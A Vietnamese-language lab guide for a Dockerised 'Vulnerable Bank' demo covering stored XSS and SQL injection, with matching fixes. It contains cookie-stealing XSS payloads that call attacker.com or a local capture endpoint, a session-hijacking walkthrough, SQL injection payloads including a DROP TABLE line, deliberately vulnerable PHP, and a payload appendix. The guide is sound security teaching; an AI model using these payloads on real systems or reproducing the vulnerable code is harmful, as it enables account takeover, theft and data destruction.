# Dự Án Bảo Mật: Cross-Site Scripting (XSS) & SQL Injection Attack
## Tài Liệu Trình Bày Toàn Diện

---

## 1. Tóm Tắt Điều Hành (Executive Summary)

**Dự án:** Thiết lập môi trường demo an toàn để nghiên cứu lỗ hổng XSS và SQL Injection trong ứng dụng ngân hàng web.

**Những gì được xây dựng:** Một ứng dụng ngân hàng dễ bị tấn công (Vulnerable Bank) kết hợp với ứng dụng tấn công (Attacker Dashboard). Hệ thống hỗ trợ toggle giữa chế độ Vulnerable (dễ bị tấn công) và Secure (an toàn) để minh họa cả lỗ hổng lẫn giải pháp.

**Kịch bản tấn công:**
- **XSS Stored:** Tiêm mã JavaScript vào trường Bio để đánh cắp session cookie của người dùng khác
- **SQL Injection:** Khai thác form đăng nhập và chuyển tiền để truy cập dữ liệu trái phép hoặc thay đổi số dư tài khoản

**Mục tiêu giáo dục:** Cung cấp hands-on experience với hai lỗ hổng bảo mật phổ biến nhất, giúp hiểu rõ cách chúng hoạt động và cách phòng chống.

---

## 2. Thiết Lập Môi Trường Thực Hành & Công Cụ (Lab Environment and Tools Setup)

### 2.1 Yêu Cầu Phần Cứng

- **CPU:** 2 cores trở lên
- **RAM:** Tối thiểu 4GB (khuyến nghị 8GB)
- **Ổ cứng:** 2GB dung lượng trống
- **Hỗ trợ:** Linux, macOS, hoặc Windows (với WSL2)

### 2.2 Phần Mềm & Thư Viện

| Công cụ | Phiên bản | Mục đích |
|---------|----------|---------|
| Docker | 20.10+ | Container hóa ứng dụng |
| Docker Compose | 1.29+ | Quản lý multi-container |
| MySQL | 8.0 | Cơ sở dữ liệu |
| PHP | 7.4+ | Runtime ứng dụng web |
| Web Browser | Chrome/Firefox/Safari | Kiểm thử & khai thác |
| PHPMyAdmin | latest | Quản lý cơ sở dữ liệu GUI |

### 2.3 Cấu Hình Mạng

```
┌─────────────────────────────────────────────┐
│          Host Machine (127.0.0.1)           │
├─────────────────────────────────────────────┤
│  Port 8080  │  Port 8081  │  Port 8082  │  │
│   PHP Web   │  PHPMyAdmin │  Attacker   │  │
│   App       │             │  Dashboard  │  │
│ (Vulnerable)│             │             │  │
└──────────────┬──────────┬───────────────────┘
               │          │
        ┌──────▼──────┐  │
        │   MySQL     │  │
        │   Port 3307 │◄─┘
        │             │
        └─────────────┘
```

**Cấu hình DNS:** Không cần thiết - sử dụng localhost

**Firewall:** Docker Compose tự động định tuyến traffic

### 2.4 Hướng Dẫn Cài Đặt

#### Bước 1: Chuẩn Bị
```bash
# Điều hướng đến thư mục dự án
cd xss-and-sql-injection-attack/vulnerable-bank

# Kiểm tra Docker đã cài đặt
docker --version
docker-compose --version
```

#### Bước 2: Khởi Động Containers
```bash
# Khởi động tất cả services
docker-compose up -d

# Kiểm tra status
docker-compose ps
```

#### Bước 3: Truy Cập Ứng Dụng

| Dịch vụ | URL | Tài khoản | Mật khẩu |
|---------|-----|----------|---------|
| Vulnerable Bank | http://localhost:8080 | alice | password123 |
| PHPMyAdmin | http://localhost:8081 | root | root |
| Attacker Dashboard | http://localhost:8082 | - | - |

#### Bước 4: Kiểm tra Cơ sở dữ liệu
- Truy cập PHPMyAdmin
- Kiểm tra database `vulnerable_bank` và các bảng: users, transactions, loans, virtual_cards, bills
- Dữ liệu mẫu sẽ được load tự động từ setup.sql

---

## 3. Triển Khai Cốt Lõi & Phân Tích Mã (Core Implementation and Code Analysis)

### 3.1 Kiến Trúc & Luồng Logic (Architecture / Flow Logic)

```
┌─────────────────────────────────────────────────────┐
│                   VULNERABLE BANK                   │
│                                                     │
│  ┌──────────────┐  ┌──────────────┐  ┌──────────┐ │
│  │  index.php   │  │ profile.php  │  │transfer. │ │
│  │  (Login)     │  │ (XSS Point)  │  │php (SQL) │ │
│  │  SQL Inject  │  │ File Upload  │  │Injection │ │
│  └──────┬───────┘  └──────┬───────┘  └────┬─────┘ │
│         │                 │               │        │
│         └─────────────────┼───────────────┘        │
│                           ▼                        │
│                  functions.php                     │
│                  (Helper Functions)                │
│                           │                        │
│         ┌─────────────────┴─────────────────┐     │
│         ▼                                   ▼     │
│    db.php                            config.php   │
│  (Database Connection)         (SECURE_MODE       │
│                                   Toggle)         │
│         │                           │              │
│         └─────────────────┬─────────┘              │
│                           ▼                        │
│                      MySQL Database                │
│              (vulnerable_bank DB)                  │
└─────────────────────────────────────────────────────┘

                         │
                         │ (Stolen Data)
                         ▼
┌─────────────────────────────────────────────────────┐
│              ATTACKER DASHBOARD                     │
│                                                     │
│  ┌──────────────┐  ┌──────────────┐  ┌──────────┐ │
│  │capture.php   │  │ index.php    │  │get_logs. │ │
│  │(Log Stealing)│  │(Display      │  │php       │ │
│  │              │  │ Control      │  │(Retrieve)│ │
│  │              │  │ Panel)       │  │          │ │
│  └──────────────┘  └──────────────┘  └──────────┘ │
│         │                                │          │
│         └────────────────┬───────────────┘         │
│                          ▼                         │
│            stolen_cookies.txt                      │
│            (Log file lưu trữ)                      │
└─────────────────────────────────────────────────────┘
```

**Luồng hoạt động:**
1. **Đăng nhập:** User gửi POST request → index.php kiểm tra credentials (SQL Injection có thể xảy ra)
2. **Session:** Session cookie được tạo (httponly flag bị vô hiệu hóa trong Vulnerable mode)
3. **Profile:** User cập nhật Bio → dữ liệu được lưu trực tiếp vào DB (Stored XSS)
4. **Khai thác XSS:** Attacker giả mạo user khác, XSS payload chạy → đánh cắp cookie
5. **Capture:** Cookie được gửi đến capture.php → lưu trong stolen_cookies.txt
6. **Attacker Dashboard:** Hiển thị các cookies bị đánh cắp

---

### 3.2 Các Đoạn Mã Quan Trọng & Giải Thích (Key Code Snippets & Explanation)

#### **Snippet 1: SQL Injection trong Form Đăng Nhập (index.php)**

```php
// ❌ VULNERABLE MODE
$username = $_POST['username'];
$password = $_POST['password'];

$sql = "SELECT * FROM users WHERE username = '$username' AND password = '$password'";
$result = $conn->query($sql);
```

**Giải thích từng dòng:**
- **Dòng 1-2:** Lấy dữ liệu trực tiếp từ POST mà không xác thực hoặc làm sạch
- **Dòng 4:** String interpolation trực tiếp trong SQL query
  - **Nguy hiểm:** Nếu user nhập `' OR '1'='1`, query sẽ trở thành:
    ```sql
    SELECT * FROM users WHERE username = '' OR '1'='1' AND password = ''
    ```
  - **Hậu quả:** Query trả về toàn bộ users (vì '1'='1' luôn đúng)
- **Dòng 5:** Thực thi query này để đăng nhập không cần mật khẩu chính xác

**Kỹ thuật SQL Injection:**
- `' OR '1'='1` - Bypass xác thực
- `'; DROP TABLE users; --` - Xóa dữ liệu
- `UNION SELECT username, password FROM users` - Trích xuất dữ liệu

---

#### **Snippet 2: Stored XSS trong Profile Bio (profile.php)**

```php
// ❌ VULNERABLE MODE
$bio = $_POST['bio'];  // Người dùng nhập: <script>fetch("http://attacker.com/log?c=" + document.cookie)</script>

$conn->query("UPDATE users SET profile_bio = '$bio' WHERE id = {$user['id']}");

// Khi user khác xem profile
echo $user['profile_bio'];  // Mã JS được render trực tiếp trong HTML
```

**Giải thích:**
- **Dòng 2:** Lấy dữ liệu từ form mà không sanitize
- **Dòng 4:** Lưu trực tiếp vào DB (Stored XSS - mã độc được lưu lâu dài)
- **Dòng 7:** Khi user khác xem profile → script tự động chạy trên trình duyệt của họ
  - **Hậu quả:** Đánh cắp session cookie, redirect sang phishing page, hay chèn malware

**Các biến thể XSS:**
- Stored: `<img src=x onerror="fetch('http://attacker.com/log?c='+document.cookie)">`
- Reflected: `http://bank.com/search.php?q=<script>alert('XSS')</script>`
- DOM-based: JavaScript client-side không escape dữ liệu user

---

#### **Snippet 3: SQL Injection trong Transfer (transfer.php)**

```php
// ❌ VULNERABLE MODE
$to_acc = $_POST['to_account'];  // Người dùng nhập: abc' OR '1'='1
$amount = (float)$_POST['amount'];

$find_sql = "SELECT * FROM users WHERE account_number = '$to_acc'";
$find_res = $conn->query($find_sql);
```

**Giải thích:**
- **Dòng 2:** Dù `amount` được cast to float, nhưng `to_account` không được xác thực
- **Dòng 4-5:** SQL query với user input trực tiếp
  - **Khai thác:** `to_account = abc' OR '1'='1`
  - Query trở thành: `SELECT * FROM users WHERE account_number = 'abc' OR '1'='1'`
  - **Hậu quả:** Trả về user đầu tiên (thường là admin), attacker chuyển tiền cho chính họ

---

### 3.3 Giải Pháp An Toàn (Secure Implementations)

#### **Phòng Chống SQL Injection - Prepared Statements (index.php - SECURE MODE)**

```php
// ✅ SECURE MODE
$sql = "SELECT * FROM users WHERE username = ? AND password = ?";
$stmt = $conn->prepare($sql);
$stmt->bind_param("ss", $username, $password);
$stmt->execute();
$result = $stmt->get_result();
```

**Tại sao nó an toàn:**
- **Prepared Statements:** Tách biệt code từ data
- **bind_param("ss", ...):** Xác định kiểu dữ liệu (string, string)
- **Hậu quả:** Bất kể user nhập gì, nó được xử lý như data, không phải code SQL
- **Ví dụ:** `' OR '1'='1` được escape → `\'\ OR \'1\'=\'1` (không còn là payload)

---

#### **Phòng Chống XSS - Output Encoding (profile.php - SECURE MODE)**

```php
// ✅ SECURE MODE - Lưu trữ
$bio_sanitized = htmlspecialchars($bio, ENT_QUOTES, 'UTF-8');
$stmt = $conn->prepare("UPDATE users SET profile_bio = ? WHERE id = ?");
$stmt->bind_param("si", $bio_sanitized, $user['id']);
$stmt->execute();

// Khi hiển thị
echo htmlspecialchars($user['profile_bio'], ENT_QUOTES, 'UTF-8');
```

**Tại sao nó an toàn:**
- **htmlspecialchars():** Chuyển các ký tự đặc biệt thành HTML entities
  - `<` → `&lt;`, `>` → `&gt;`, `"` → `&quot;`, `'` → `&#039;`
- **ENT_QUOTES:** Encode cả dấu ngoặc đơn và kép
- **Hậu quả:** Script tag `<script>...` trở thành text, không được execute

---

#### **Cookie Security - HttpOnly & Secure Flags (index.php - SECURE MODE)**

```php
// ✅ SECURE MODE
session_set_cookie_params([
    'httponly' => true,   // Cookie không accessible từ JavaScript
    'secure' => true,     // Chỉ gửi qua HTTPS
    'samesite' => 'Strict' // Không gửi cookie trong cross-site request
]);
```

**Bảo vệ:**
- **HttpOnly:** Ngay cả khi có XSS, `document.cookie` trả về empty
- **Secure:** Prevent man-in-the-middle attacks
- **SameSite=Strict:** Protect CSRF attacks

---

## 4. Hướng Dẫn Trình Bày Từng Bước (Step-by-Step Demonstration Walkthrough)

### 4.1 Bước 1: Chuẩn Bị Môi Trường (Initialization)

```bash
# Terminal 1: Khởi động containers
cd xss-and-sql-injection-attack/vulnerable-bank
docker-compose up -d

# Kiểm tra logs (nếu cần troubleshoot)
docker-compose logs -f web

# Đợi ~ 30 giây để MySQL khởi động
sleep 30

# Kiểm tra containers
docker-compose ps
```

**Kết quả mong đợi:**
```
NAME            STATUS
php_app         Up 2 minutes
mysql_db        Up 2 minutes
attacker_app    Up 2 minutes
phpmyadmin_app  Up 2 minutes
```

**Truy cập từng service:**
- Vulnerable Bank: http://localhost:8080 → Trang Login
- PHPMyAdmin: http://localhost:8081 → DB Dashboard
- Attacker Dashboard: http://localhost:8082 → Attacker Panel

---

### 4.2 Bước 2: Thực Thi Tấn Công XSS Stored (Execution / The Attack)

#### **4.2.1 Đăng Nhập vào Vulnerable Bank**

**Hành động:**
1. Mở http://localhost:8080
2. Nhập Username: `alice`
3. Nhập Password: `password123`
4. Click "Login"

**Kết quả:** 
- Được redirect đến Dashboard
- Thấy Balance: $1200.50

---

#### **4.2.2 Chuyển đến Trang Profile để Inject XSS**

**Hành động:**
1. Click "Profile" trong sidebar (hoặc menu)
2. Scroll xuống tìm trường "Bio" (Tiểu sử)
3. Xóa nội dung hiện tại
4. Dán payload XSS sau:
   ```html
   <img src=x onerror="fetch('http://localhost:8082/capture.php?cookie='+document.cookie);">
   ```

**Giải thích payload:**
- `<img src=x>` - Tạo img tag (src không hợp lệ)
- `onerror="..."` - Khi img không load, chạy code trong onerror
- `fetch(...)` - Gửi HTTP request đến attacker server
- `document.cookie` - Kèm session cookie của user hiện tại

5. Click "Update Bio" để lưu

**Kết quả:**
- Bio được update thành công
- Payload được lưu trữ trong database (Stored XSS)

---

#### **4.2.3 Kích Hoạt XSS bằng User Khác**

**Hành động:**
1. **Logout:** Click Logout button
2. **Đăng nhập với user khác:**
   - Username: `bob`
   - Password: `qwerty`
3. **Truy cập Alice's profile:**
   - Vào "Transfer" hoặc "Users" section
   - Tìm cách xem profile của Alice (hoặc modify code để tạo public profile page)
   - Khi profile của Alice load → Bio chứa payload XSS tự động chạy

**Hậu quả:**
- JavaScript chạy trong context của Bob's browser
- `document.cookie` là Bob's session cookie
- Cookie được gửi đến http://localhost:8082/capture.php
- Attacker có được Bob's session

---

### 4.3 Bước 3: Xác Minh Kết Quả (Verification / The Result)

#### **3.1 Kiểm tra Attacker Dashboard**

**Hành động:**
1. Mở http://localhost:8082 (Attacker Dashboard)
2. Scroll xuống xem "Captured Cookies"

**Kết quả:**
```
[2024-05-08 14:23:45] IP: 172.17.0.1 | Cookie: PHPSESSID=abc123xyz789...
[2024-05-08 14:25:12] IP: 172.17.0.1 | Cookie: PHPSESSID=def456uvw012...
```

**Giải thích:**
- Mỗi dòng là một session cookie bị đánh cắp
- IP: Client IP (trong Docker là internal IP)
- Cookie: Session ID của victim

---

#### **3.2 Sử dụng Captured Cookie để Hijack Session**

**Hành động (sử dụng Browser DevTools):**
1. Mở http://localhost:8080 (Vulnerable Bank)
2. Mở DevTools (F12 hoặc Cmd+Option+I trên Mac)
3. Vào Console tab
4. Nhập lệnh:
   ```javascript
   document.cookie = "PHPSESSID=abc123xyz789; path=/; domain=localhost";
   ```
5. Refresh trang
6. Bạn sẽ đã logged in với session của user bị tấn công

**Kết quả:**
- Hiển thị dashboard của Bob (hoặc user bị tấn công)
- Có quyền xem balance, transactions, và thậm chí chuyển tiền

---

### 4.4 Bước Thêm: Tấn Công SQL Injection (Bonus)

#### **4.4.1 SQL Injection trong Login**

**Hành động:**
1. Trở về trang login (http://localhost:8080)
2. Nhập Username: `' OR '1'='1`
3. Nhập Password: `anything`
4. Click Login

**Kết quả:**
- Bị redirect đến dashboard của user đầu tiên (thường là admin)
- **Lý do:** Query trở thành:
  ```sql
  SELECT * FROM users WHERE username = '' OR '1'='1' AND password = 'anything'
  ```
  - Điều kiện `'1'='1'` luôn đúng → query trả về user đầu tiên

---

#### **4.4.2 SQL Injection trong Transfer Money**

**Hành động:**
1. Đăng nhập với Alice
2. Vào Transfer Money page
3. Nhập "To Account": `VB-000001' OR '1'='1`
4. Nhập "Amount": `100`
5. Click Transfer

**Kết quả:**
- Query `SELECT * FROM users WHERE account_number = 'VB-000001' OR '1'='1'`
- Trả về user đầu tiên (admin)
- Alice chuyển $100 cho admin (ngoài ý định)

---

## 5. Vá Lỗ Hổng / Cơ Chế Phòng Thủ (Vulnerability Patch / Defense Mechanism)

### 5.1 Kích Hoạt Secure Mode

```bash
# Chỉnh sửa docker-compose.yml
# Đổi: SECURE_MODE: "false"
# Thành: SECURE_MODE: "true"

# Hoặc sử dụng script helper
cd vulnerable-bank
chmod +x toggle-mode.sh
./toggle-mode.sh secure  # Chuyển sang Secure mode
./toggle-mode.sh vulnerable  # Chuyển về Vulnerable mode
```

**Kết quả:**
- Config được update
- Container web được rebuild
- Toàn bộ input được sanitize
- Prepared statements được sử dụng
- Cookie flags được set an toàn

---

### 5.2 Chi Tiết Các Fix

#### **Fix #1: SQL Injection - Prepared Statements**

**Trước (Vulnerable):**
```php
$sql = "SELECT * FROM users WHERE username = '$username' AND password = '$password'";
$result = $conn->query($sql);
```

**Sau (Secure):**
```php
$sql = "SELECT * FROM users WHERE username = ? AND password = ?";
$stmt = $conn->prepare($sql);
$stmt->bind_param("ss", $username, $password);
$stmt->execute();
$result = $stmt->get_result();
```

**Cơ chế bảo vệ:**
- `?` (placeholders) tách code từ data
- `bind_param()` type-safe binding
- Database driver xử lý escaping, không PHP

---

#### **Fix #2: Stored XSS - Output Encoding**

**Trước (Vulnerable):**
```php
$conn->query("UPDATE users SET profile_bio = '$bio' WHERE id = {$user['id']}");
echo $user['profile_bio'];  // Direct output
```

**Sau (Secure):**
```php
$bio_sanitized = htmlspecialchars($bio, ENT_QUOTES, 'UTF-8');
$stmt = $conn->prepare("UPDATE users SET profile_bio = ? WHERE id = ?");
$stmt->bind_param("si", $bio_sanitized, $user['id']);
$stmt->execute();

echo htmlspecialchars($user['profile_bio'], ENT_QUOTES, 'UTF-8');
```

**Cơ chế bảo vệ:**
- `htmlspecialchars()` convert `<>&"'` thành HTML entities
- Dù là Stored XSS, khi render → text bình thường, không được execute

---

#### **Fix #3: Session Cookie Security**

**Trước (Vulnerable):**
```php
session_set_cookie_params(['httponly' => false]);  // JS có thể access
```

**Sau (Secure):**
```php
session_set_cookie_params([
    'httponly' => true,      // JS không access được
    'secure' => true,        // Chỉ gửi qua HTTPS
    'samesite' => 'Strict'   // Không gửi cross-site
]);
```

**Cơ chế bảo vệ:**
- HttpOnly: Ngay cả XSS cũng không đánh cắp được
- Secure: Không leak qua HTTP không mã hóa
- SameSite: Protect CSRF

---

#### **Fix #4: File Upload Validation**

**Trước (Vulnerable):**
```php
$target_file = $target_dir . basename($_FILES["avatar"]["name"]);
move_uploaded_file($_FILES["avatar"]["tmp_name"], $target_file);
// Bất kỳ file nào cũng được chấp nhận, kể cả .php -> RCE
```

**Sau (Secure):**
```php
$allowed_extensions = ['jpg', 'jpeg', 'png', 'gif'];
$file_extension = strtolower(pathinfo($_FILES["avatar"]["name"], PATHINFO_EXTENSION));
$allowed_mime_types = ['image/jpeg', 'image/png', 'image/gif'];
$file_mime = mime_content_type($_FILES["avatar"]["tmp_name"]);

if (in_array($file_extension, $allowed_extensions) && 
    in_array($file_mime, $allowed_mime_types)) {
    // File hợp lệ, có thể upload
}
```

**Cơ chế bảo vệ:**
- Extension whitelist (chỉ cho phép ảnh)
- MIME type validation
- Prevent shell upload attacks (RCE)

---

### 5.3 Ngoài Ra, Cách Attacker Có Thể Vượt Qua (Theoretical Bypasses)

Khi defend được implement, attacker có thể thử:

#### **Bypass #1: MIME Type Spoofing**
- **Tấn công:** Upload file .php nhưng thay đổi magic bytes thành image
- **Phòng chống:** Validating magic bytes, không chỉ extension

#### **Bypass #2: CSS-in-HTML XSS (CSP Bypass)**
- **Tấn công:** `<style>@import "http://attacker.com/exfil.css?data=" + userData</style>`
- **Phòng chống:** Content Security Policy (CSP) headers

#### **Bypass #3: Time-based SQL Injection**
- **Tấn công:** `OR SLEEP(5)` - thậm chí prepared statements không giúp nếu logic sai
- **Phòng chống:** WAF (Web Application Firewall), rate limiting

#### **Bypass #4: Unicode Encoding Bypass**
- **Tấn công:** `<script>` → `<s\u0063ript>` (Unicode escape)
- **Phòng chống:** Multi-layer encoding, CSP strict-dynamic

---

## 6. Kết Luận & Hạn Chế (Conclusion and Limitations)

### 6.1 Những Thách Thức Kỹ Thuật Chính

#### **1. Quản lý Session Complexities**
- **Vấn đề:** Session cookie trong Docker/container environment khác với production
- **Giải pháp được áp dụng:** Simulated session hijacking thông qua cookie capture
- **Hạn chế:** Cross-domain session sharing trong HTTPS environment thực tế phức tạp hơn

#### **2. Automatic Database Initialization**
- **Vấn đề:** Setup.sql cần thời gian chạy, test data phải consistent
- **Giải pháp:** Sử dụng Docker entrypoint script
- **Hạn chế:** Nếu container restart, dữ liệu có thể reset (không persistent)

#### **3. SECURE_MODE Toggle Implementation**
- **Vấn đề:** Phải maintain 2 versions của code logic (conditional blocks)
- **Giải pháp:** Environment variable `SECURE_MODE` + helper functions
- **Hạn chế:** Code duplication, khó bảo trì, dễ introduce bugs

---

### 6.2 Hạn Chế Của Ứng Dụng

| Hạn chế | Lý do | Ảnh hưởng |
|---------|-------|----------|
| **No HTTPS** | Demo là local, không cần SSL | Real attack scenarios cần HTTPS |
| **Simple Payloads** | XSS payload basic, không advanced | Không test CSP bypass, DOM-based XSS |
| **No WAF** | Giáo dục, không production setup | Real-world cần Web App Firewall |
| **Single-layer defense** | Chỉ demo prepared statements | SQL injection vẫn có thể bypass nếu logic sai |
| **No Rate Limiting** | Brute force attack không bị throttle | Attacker có thể bruteforce login vô tận |
| **Log Retention** | stolen_cookies.txt không rotate | Lâu dài sẽ fill disk |

---

### 6.3 Cải Thiện cho Production Environment

#### **Cấp 1: Essentials**
```php
// 1. Prepared Statements (đã làm)
$stmt = $conn->prepare("SELECT * FROM users WHERE id = ?");
$stmt->bind_param("i", $id);

// 2. Output Encoding (đã làm)
echo htmlspecialchars($data, ENT_QUOTES, 'UTF-8');

// 3. HttpOnly Cookies (đã làm)
session_set_cookie_params(['httponly' => true]);

// 4. HTTPS + Secure Flag (THÊM)
session_set_cookie_params(['secure' => true]);

// 5. Rate Limiting (THÊM)
if ($login_attempts > 5) {
    http_response_code(429);
    die("Too many attempts");
}

// 6. Logging & Monitoring (THÊM)
error_log("Potential SQL injection attempt: " . $_POST['username']);
```

#### **Cấp 2: Advanced**
```php
// 1. Content Security Policy (CSP)
header("Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'");

// 2. X-Frame-Options (Prevent Clickjacking)
header("X-Frame-Options: DENY");

// 3. Web Application Firewall
// Use mod_security, AWS WAF, Cloudflare WAF

// 4. Database User Permissions
// CREATE USER app_user IDENTIFIED BY 'strong_password';
// GRANT SELECT, INSERT, UPDATE ON vulnerable_bank.* TO app_user;
// Không grant DELETE, DROP

// 5. Secrets Management
// Use environment variables, .env files, vault systems
// Không hardcode credentials

// 6. Input Validation (Whitelist approach)
$allowed_characters = '/^[a-zA-Z0-9_-]+$/';
if (!preg_match($allowed_characters, $username)) {
    die("Invalid username format");
}
```

#### **Cấp 3: Enterprise**
- Penetration testing & code review
- Security scanning tools (OWASP ZAP, Burp Suite)
- Bug bounty programs
- Incident response plans
- Two-factor authentication (2FA)
- End-to-end encryption
- Compliance (PCI-DSS, OWASP Top 10)

---

## 7. Tài Liệu Tham Khảo & Ghi Công (References & Attributions)

### 7.1 OWASP Vulnerabilities

1. **OWASP Top 10 2021**
   - A03:2021 – Injection (SQL Injection)
   - A07:2021 – Cross-Site Scripting (XSS)
   - https://owasp.org/Top10/

2. **OWASP Testing Guide**
   - SQL Injection: https://owasp.org/www-community/attacks/SQL_Injection
   - XSS: https://owasp.org/www-community/attacks/xss/

3. **OWASP Cheat Sheets**
   - SQL Injection Prevention: https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html
   - XSS Prevention: https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html

---

### 7.2 Documentation & Guides

4. **PHP Security Manual**
   - mysqli prepared statements: https://www.php.net/manual/en/mysqli.quickstart.prepared-statements.php
   - htmlspecialchars(): https://www.php.net/manual/en/function.htmlspecialchars.php

5. **MySQL Documentation**
   - Prepared Statements: https://dev.mysql.com/doc/refman/8.0/en/
   - User & Privilege Management: https://dev.mysql.com/doc/refman/8.0/en/user-account-management.html

6. **Docker Documentation**
   - Docker Compose: https://docs.docker.com/compose/
   - Docker Security Best Practices: https://docs.docker.com/engine/security/

---

### 7.3 Security Tools & Resources

7. **OWASP ZAP (Zed Attack Proxy)**
   - Free security scanning tool
   - https://www.zaproxy.org/

8. **Burp Suite Community Edition**
   - Web security testing framework
   - https://portswigger.net/burp/communitydownload

9. **PortSwigger Web Security Academy**
   - Free interactive tutorials
   - SQL Injection: https://portswigger.net/web-security/sql-injection
   - XSS: https://portswigger.net/web-security/cross-site-scripting

---

### 7.4 Code References & Inspiration

10. **Stack Overflow Solutions**
    - Using prepared statements in PHP/MySQL
    - XSS prevention techniques
    - Session security in PHP

11. **GitHub Security Resources**
    - OWASP Top 10 Code Examples: https://github.com/OWASP/Top10
    - Vulnerable Application Examples: https://github.com/WebGoat/WebGoat

---

### 7.5 Academic & Training Materials

12. **PortSwigger Web Security Academy**
    - Comprehensive security courses
    - Interactive labs and challenges
    - https://portswigger.net/web-security

13. **Hack The Box & TryHackMe**
    - Hands-on cybersecurity training
    - Web security challenges
    - https://www.hackthebox.com/ & https://tryhackme.com/

---

### 7.6 Attribution & Acknowledgments

**Project Contributors:**
- Dự án giáo dục phục vụ mục đích học tập
- Inspired by PortSwigger, OWASP, và các dự án security demo open-source

**Disclaimer:**
- ⚠️ **Bảo mật:** Dự án này chỉ cho mục đích giáo dục
- ⚠️ **Pháp luật:** Không sử dụng để tấn công các hệ thống không có quyền
- ⚠️ **Trách nhiệm:** Người sử dụng chịu trách nhiệm pháp lý về hành động của họ

---

## Phụ Lục

### A. Danh Sách Payload Phổ Biến

#### **SQL Injection Payloads**
```sql
-- Bypass xác thực
' OR '1'='1
' OR 1=1 --
admin' --
' OR 'a'='a

-- UNION-based
' UNION SELECT NULL, username, password FROM users --
' UNION SELECT 1,2,3,4,5 --

-- Boolean-based Blind
' AND 1=1 --
' AND 1=2 --

-- Time-based Blind
' AND SLEEP(5) --
' OR IF(1=1,SLEEP(5),0) --
```

#### **XSS Payloads**
```html
<!-- Basic -->
<script>alert('XSS')</script>

<!-- Image event handler -->
<img src=x onerror=alert('XSS')>

<!-- SVG -->
<svg onload=alert('XSS')>

<!-- Event attributes -->
<body onload=alert('XSS')>
<input onfocus=alert('XSS') autofocus>

<!-- Unicode/Hex encoding -->
<img src=x onerror="eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))">

<!-- Protocol handler -->
<a href="javascript:alert('XSS')">Click me</a>
```

---

### B. Cấu Trúc Database

```sql
-- Users table
CREATE TABLE users (
    id INT PRIMARY KEY AUTO_INCREMENT,
    username VARCHAR(50) UNIQUE NOT NULL,
    password VARCHAR(255) NOT NULL,
    balance DECIMAL(10,2) DEFAULT 0,
    profile_bio TEXT,
    account_number VARCHAR(20) UNIQUE,
    avatar VARCHAR(255),
    role ENUM('user', 'admin') DEFAULT 'user'
);

-- Transactions table
CREATE TABLE transactions (
    id INT PRIMARY KEY AUTO_INCREMENT,
    user_id INT NOT NULL,
    type ENUM('credit', 'debit'),
    description TEXT,
    amount DECIMAL(10,2),
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    FOREIGN KEY (user_id) REFERENCES users(id)
);
```

---

### C. Cấu Lệnh Docker Hữu Ích

```bash
# View logs
docker-compose logs -f web

# Execute command in container
docker-compose exec web bash

# Rebuild container
docker-compose up --build

# Stop all containers
docker-compose down

# Remove all volumes (reset database)
docker-compose down -v

# Access MySQL directly
docker-compose exec db mysql -u root -p vulnerable_bank
```

---

**Tài liệu này được tạo cho mục đích giáo dục bảo mật ứng dụng web.**
**Ngày tạo: 2024 | Phiên bản: 1.0**

